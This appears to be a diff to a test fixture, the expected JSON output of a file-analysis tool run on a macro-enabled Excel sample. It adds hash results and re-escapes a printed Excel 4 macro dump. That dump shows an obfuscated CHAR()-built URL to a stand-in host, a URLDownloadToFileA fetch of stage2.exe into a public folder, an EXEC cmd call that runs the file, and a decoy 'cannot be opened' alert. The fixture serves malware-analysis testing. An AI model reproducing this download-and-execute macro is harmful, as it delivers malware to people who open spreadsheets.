@@ -420,6 +420,15 @@
           "summary": "Archive Analysis: extracted 6 of 6 files: ([Content_Types].xml, xl/workbook.xml, xl/macrosheets/sheet1.xml, xl/vbaProject.bin, xl/_rels/workbook.xml.rels, _rels/.rels)",
           "tags": {}
         },
+        "file_hash_analyzer": {
+          "details": {
+            "md5": "dac036e11f6c0b23da1f4ed33974ee52",
+            "sha1": "0f83bce62cf88916fa0d45c972306323e0fe9749",
+            "sha256": "c592e2e50f387766a4e6505e74c566be4ca69dbb2aa919d2fd3a043c35548412"
+          },
+          "summary": null,
+          "tags": {}
+        },
         "file_type": {
           "details": {
             "is_email_file": false,
@@ -460,7 +469,7 @@
                 "file_name": "xlm_macro",
                 "local_path": "a232b79858b25e9cbdeb5ffe4ede84d5ff2b62141bb973d8497a34e18c0bb0e7",
                 "stream_path": "xlm_macro",
-                "vba_code": "' RAW EXCEL4/XLM MACRO FORMULAS:\n' SHEET: Macro1, Macrosheet\n' CELL:A1, =FORMULA(CHAR(104)&CHAR(116)&CHAR(116)&CHAR(112)&CHAR(58)&CHAR(47)&CHAR(47)&CHAR(120)&CHAR(108)&CHAR(109)&CHAR(45)&CHAR(98)&CHAR(117)&CHAR(105)&CHAR(108)&CHAR(116)&CHAR(46)&CHAR(101)&CHAR(120)&CHAR(97)&CHAR(109)&CHAR(112)&CHAR(108)&CHAR(101)&CHAR(46)&CHAR(99)&CHAR(111)&CHAR(109)&CHAR(47)&CHAR(115)&CHAR(116)&CHAR(97)&CHAR(103)&CHAR(101)&CHAR(50)&CHAR(46)&CHAR(101)&CHAR(120)&CHAR(101),A12), None\n' CELL:A2, =FORMULA(\"c:\\users\\public\\é日本.exe\",A13), None\n' CELL:A3, =CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCJJ\",0,A12,A13,0,0), None\n' CELL:A4, =EXEC(\"cmd /c \"&A13), None\n' CELL:A5, =ALERT(\"The workbook cannot be opened\",2), None\n' CELL:A6, =IF(1=2,GOTO(A11),), None\n' CELL:A7, =CALL(\"wininet\",\"InternetOpenUrlA\",\"JJCJJJ\",0,\"https://xlm-plain.example.com/a?b=1\",0,0,0), None\n' CELL:A8, =CALL(\"kernel32\",\"WinExec\",\"JCJ\",\"HTTP://Upper.example.com/a b\",0), None\n' CELL:A9, =CALL(\"kernel32\",\"WinExec\",\"JCJ\",\"http://%\",0), None\n' CELL:A10, =HALT(), None\n' CELL:A11, =EXEC(\"never.exe\"), None\n' CELL:A12, =0, None\n' CELL:A13, =0, None\n' - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n' EMULATION - DEOBFUSCATED EXCEL4/XLM MACRO FORMULAS:\n' CELL:A1        , FullEvaluation      , FORMULA(\"http://xlm-built.example.com/stage2.exe\",A12)\n' CELL:A2        , FullEvaluation      , FORMULA(\"c:\\users\\public\\é日本.exe\",A13)\n' CELL:A3        , FullEvaluation      , CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCJJ\",0,\"http://xlm-built.example.com/stage2.exe\",\"c:\\users\\public\\é日本.exe\",0,0)\n' CELL:A4        , PartialEvaluation   , =EXEC(\"cmd /c c:\\users\\public\\é日本.exe\")\n' CELL:A5        , PartialEvaluation   , =ALERT(\"The workbook cannot be opened\",2)\n' CELL:A6        , FullEvaluation      , IF(1=2,GOTO(A11),)\n' CELL:A7        , FullEvaluation      , CALL(\"wininet\",\"InternetOpenUrlA\",\"JJCJJJ\",0,\"https://xlm-plain.example.com/a?b=1\",0,0,0)\n' CELL:A8        , FullEvaluation      , CALL(\"kernel32\",\"WinExec\",\"JCJ\",\"HTTP://Upper.example.com/a b\",0)\n' CELL:A9        , FullEvaluation      , CALL(\"kernel32\",\"WinExec\",\"JCJ\",\"http://%\",0)\n' CELL:A10       , End                 , HALT()",
+                "vba_code": "' RAW EXCEL4/XLM MACRO FORMULAS:\n' SHEET: Macro1, Macrosheet\n' CELL:A1, =FORMULA(CHAR(104)&CHAR(116)&CHAR(116)&CHAR(112)&CHAR(58)&CHAR(47)&CHAR(47)&CHAR(120)&CHAR(108)&CHAR(109)&CHAR(45)&CHAR(98)&CHAR(117)&CHAR(105)&CHAR(108)&CHAR(116)&CHAR(46)&CHAR(101)&CHAR(120)&CHAR(97)&CHAR(109)&CHAR(112)&CHAR(108)&CHAR(101)&CHAR(46)&CHAR(99)&CHAR(111)&CHAR(109)&CHAR(47)&CHAR(115)&CHAR(116)&CHAR(97)&CHAR(103)&CHAR(101)&CHAR(50)&CHAR(46)&CHAR(101)&CHAR(120)&CHAR(101),A12), None\n' CELL:A2, =FORMULA(\"c:\\users\\public\\\u00e9\u65e5\u672c.exe\",A13), None\n' CELL:A3, =CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCJJ\",0,A12,A13,0,0), None\n' CELL:A4, =EXEC(\"cmd /c \"&A13), None\n' CELL:A5, =ALERT(\"The workbook cannot be opened\",2), None\n' CELL:A6, =IF(1=2,GOTO(A11),), None\n' CELL:A7, =CALL(\"wininet\",\"InternetOpenUrlA\",\"JJCJJJ\",0,\"https://xlm-plain.example.com/a?b=1\",0,0,0), None\n' CELL:A8, =CALL(\"kernel32\",\"WinExec\",\"JCJ\",\"HTTP://Upper.example.com/a b\",0), None\n' CELL:A9, =CALL(\"kernel32\",\"WinExec\",\"JCJ\",\"http://%\",0), None\n' CELL:A10, =HALT(), None\n' CELL:A11, =EXEC(\"never.exe\"), None\n' CELL:A12, =0, None\n' CELL:A13, =0, None\n' - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n' EMULATION - DEOBFUSCATED EXCEL4/XLM MACRO FORMULAS:\n' CELL:A1        , FullEvaluation      , FORMULA(\"http://xlm-built.example.com/stage2.exe\",A12)\n' CELL:A2        , FullEvaluation      , FORMULA(\"c:\\users\\public\\\u00e9\u65e5\u672c.exe\",A13)\n' CELL:A3        , FullEvaluation      , CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCJJ\",0,\"http://xlm-built.example.com/stage2.exe\",\"c:\\users\\public\\\u00e9\u65e5\u672c.exe\",0,0)\n' CELL:A4        , PartialEvaluation   , =EXEC(\"cmd /c c:\\users\\public\\\u00e9\u65e5\u672c.exe\")\n' CELL:A5        , PartialEvaluation   , =ALERT(\"The workbook cannot be opened\",2)\n' CELL:A6        , FullEvaluation      , IF(1=2,GOTO(A11),)\n' CELL:A7        , FullEvaluation      , CALL(\"wininet\",\"InternetOpenUrlA\",\"JJCJJJ\",0,\"https://xlm-plain.example.com/a?b=1\",0,0,0)\n' CELL:A8        , FullEvaluation      , CALL(\"kernel32\",\"WinExec\",\"JCJ\",\"HTTP://Upper.example.com/a b\",0)\n' CELL:A9        , FullEvaluation      , CALL(\"kernel32\",\"WinExec\",\"JCJ\",\"http://%\",0)\n' CELL:A10       , End                 , HALT()",
                 "vba_filename": "xlm_macro.txt"
               }
             ],
@@ -621,6 +630,26 @@
           "tags": {}
         }
       },
+      "tags": {}
+    },
+    "md5:dac036e11f6c0b23da1f4ed33974ee52": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "relationships": {
+        "is_hash_of file:c592e2e50f387766a4e6505e74c566be4ca69dbb2aa919d2fd3a043c35548412": true
+      },
+      "results": {},
+      "tags": {}
+    },
+    "sha256:c592e2e50f387766a4e6505e74c566be4ca69dbb2aa919d2fd3a043c35548412": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "relationships": {
+        "is_hash_of file:c592e2e50f387766a4e6505e74c566be4ca69dbb2aa919d2fd3a043c35548412": true
+      },
+      "results": {},
       "tags": {}
     },
     "url:HTTP://Upper.example.com/a": {
